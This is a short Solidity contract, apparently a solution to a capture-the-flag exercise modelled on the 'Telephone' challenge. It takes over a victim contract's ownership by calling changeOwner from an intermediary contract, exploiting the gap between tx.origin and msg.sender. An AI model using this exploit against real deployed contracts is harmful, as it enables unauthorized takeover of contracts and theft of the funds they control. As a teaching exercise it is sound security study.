// SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;
interface Telephone {
    function changeOwner(address _owner) external;
}
contract TelephoneAttack {
    address internal immutable victim = 0x8E4fDB4571Eae557aF8311b63AB87aE2a9c57d3A;
    // exploit tx.origin and msg.sender discrepancy to change the owner of the telephone contract to the attacker's address
    function attack() public {
        Telephone(victim).changeOwner(msg.sender);
    }
}